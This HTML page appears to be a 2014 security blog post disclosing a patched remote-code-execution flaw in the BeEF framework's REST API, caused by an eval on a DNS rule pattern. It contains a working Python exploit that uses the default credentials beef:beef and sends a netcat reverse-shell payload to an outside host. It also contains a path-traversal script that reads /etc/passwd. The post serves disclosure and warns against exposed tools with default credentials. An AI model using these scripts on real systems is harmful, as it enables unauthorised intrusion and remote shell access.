<!DOCTYPE html>
<html lang="en-us">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<style type=text/css>body{font-family:monospace;}</style>
	<title>rce in browser exploitation framework (BeEF)</title>
	
	
	<link rel="stylesheet" href="/css/style.css">
	
	
</head>
<body>
	<header>

	<div style="float: right;"></div><br>
	<p>
	<nav>
			<a href="/"><b>post</b></a>.
			
			
			<a href="/other/"><b>other</b></a>.
			
			<a href="/about/"><b>about</b></a>.
			
	</nav>
	</p>
	
</header>

	
	<main>
		<article>
			<h1>rce in browser exploitation framework (BeEF)</h1>
			<b><time>2014-05-13</time></b>
		       

			<div>
				<p>Let me preface this post by saying that this vulnerability is <em>already fixed</em>, and was caught pretty early during the development process.  The vulnerability was originally introduced during a merge for the new DNS extension, and was promptly <a href="https://github.com/beefproject/beef/commit/39e672f4207aa46c4c0c11e0ce21cbaa3ab45d71">patched</a> by antisnatchor on 03022014.  Although this vulnerability was caught fairly quickly, it still made it into the master branch.  I post this only because I&rsquo;ve seen too many penetration testers leaving their tools externally exposed, often with default credentials.</p>
<p>The vulnerability is a trivial one, but is capable of returning a reverse shell to an attacker.  BeEF exposes a REST API for modules and scripts to use; useful for dumping statistics, pinging hooked browsers, and more.  It&rsquo;s quite powerful.   This can be accessed by simply pinging <code>http://127.0.0.1:3000/api/</code> and providing a valid token.  This token is static across a single session, and can be obtained by sending a POST to <code>http://127.0.0.1:3000/api/admin/login</code> with appropriate credentials.  Default credentials are beef:beef, and I don&rsquo;t know many users that change this right away.  It&rsquo;s also of interest to note that the throttling code does not exist in the API login routine, so a brute force attack is possible here.</p>
<p>The vulnerability lies in one of the exposed API functions, <code>/rule</code>.  The code for this was as follows:</p>
<pre tabindex="0"><code># Adds a new DNS rule
        post &#39;/rule&#39; do
          begin
            body = JSON.parse(request.body.read)

            pattern = body[&#39;pattern&#39;]
            type = body[&#39;type&#39;]
            response = body[&#39;response&#39;]

            # Validate required JSON keys
            unless [pattern, type, response].include?(nil)
              # Determine whether &#39;pattern&#39; is a String or Regexp
              begin

                pattern_test = eval pattern
                pattern = pattern_test if pattern_test.class == Regexp
   #             end
              rescue =&gt; e;
              end
</code></pre><p>The obvious flaw is the eval on user-provided data.  We can exploit this by POSTing a new DNS rule with a malicious pattern:</p>
<pre tabindex="0"><code>import requests
import json
import sys

def fetch_default(ip):
    url = &#39;http://%s:3000/api/admin/login&#39; % ip
    headers = { &#39;Content-Type&#39; : &#39;application/json; charset=UTF-8&#39; }
    data = { &#39;username&#39; : &#39;beef&#39;, &#39;password&#39; : &#39;beef&#39; }

    response = requests.post(url, headers=headers, data=json.dumps(data))
    if response.status_code is 200 and json.loads(response.content)[&#39;success&#39;]:
        return json.loads(response.content)[&#39;token&#39;]

try:
    ip = &#39;192.168.1.6&#39;

    if len(sys.argv) &gt; 1:
        token = sys.argv[1]
    else:
        token = fetch_default(ip)

    if not token:
        print &#39;Could not get auth token&#39;
        sys.exit(1)

    url = &#39;http://%s:3000/api/dns/rule?token=%s&#39; % (ip, token)
    sploit = &#39;%x(nc 192.168.1.97 4455 -e /bin/bash)&#39;

    headers = { &#39;Content-Type&#39; : &#39;application/json; charset=UTF-8&#39; }
    data = { &#39;pattern&#39; : sploit,
             &#39;type&#39; : &#39;A&#39;,
             &#39;response&#39; : [ &#39;127.0.0.1&#39; ]
           }

    response = requests.post(url, headers=headers, data=json.dumps(data))
    print response.status_code
except Exception, e:
    print e
</code></pre><p>You could execute ruby to grab a shell, but BeEF restricts some of the functions we can use (such as exec or system).</p>
<p>There&rsquo;s also an instance of LFI, this time using the server API.  <code>/api/server/bind</code> allows us to mount files at the root of the BeEF web server.  The path defaults to the current path, but can be traversed out of:</p>
<pre tabindex="0"><code>def run_lfi(ip, token):
    url = &#39;http://%s:3000/api/server/bind?token=%s&#39; % (ip, token)
    headers = { &#39;Content-Type&#39; : &#39;application/json&#39;}
    data = { &#39;mount&#39; : &#34;/tmp.txt&#34;,
             &#39;local_file&#39; : &#34;/../../../etc/passwd&#34;
           }

    response = requests.post(url, headers=headers, data=json.dumps(data))
    print response.status_code
</code></pre><p>We can then hit our server at /tmp.txt for <code>/etc/passwd</code>.  Though this appears to be intended behavior, and perhaps labeling it an LFI is a misnomer, it is still yet another example of why you should <em>not</em> expose these tools externally with default credentials.  Default credentials are just bad, period.  Stop it.</p>

			</div>
		</article>
	</main>
<aside>
	<div>
		<div>
			<h3>LATEST POSTS</h3>
		</div>
		<div>
			<ul>
				
				<li><a href="/blog/leveraging-lua-to-sniff-memcached-proxies/">leveraging Lua to sniff memcached proxies</a></li>
				
				<li><a href="/blog/the-fanciful-allure-and-utility-of-syscalls/">the fanciful allure and utility of syscalls</a></li>
				
				<li><a href="/blog/on-exploiting-cve-2021-1648-splwow64-lpe/">On Exploiting CVE-2021-1648 (splwow64 LPE)</a></li>
				
				<li><a href="/blog/digging-the-adobe-sandbox-ipc-internals/">Digging the Adobe Sandbox - IPC Internals</a></li>
				
				<li><a href="/blog/exploiting-leaked-process-and-thread-handles/">Exploiting Leaked Process and Thread Handles</a></li>
				
			</ul>
		</div>
	</div>
</aside>


	<footer>
	<p>&copy; 2024 <a href="https://dronesec.net/"><b>Bryan Alexander</b></a>.
	</p>
</footer>

</body>
</html>
